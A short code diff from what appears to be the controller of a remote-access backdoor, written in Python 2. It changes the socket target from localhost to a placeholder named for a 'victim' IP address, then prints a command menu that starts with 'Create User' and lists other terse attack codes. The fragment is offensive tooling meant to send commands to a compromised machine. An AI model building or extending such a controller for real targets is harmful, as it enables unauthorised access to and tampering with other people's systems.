@@ -15,7 +15,7 @@ def main():
     command_list = ["CU" , "DU" , "DRK", "DF" , "GI" , "EC" ]
     
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("127.0.0.1", 12345))
+    s.connect((victims_ip_address_in_quotes, 12345))
     while True:
         print "COMMANDS:"
         print "CU - Create User"
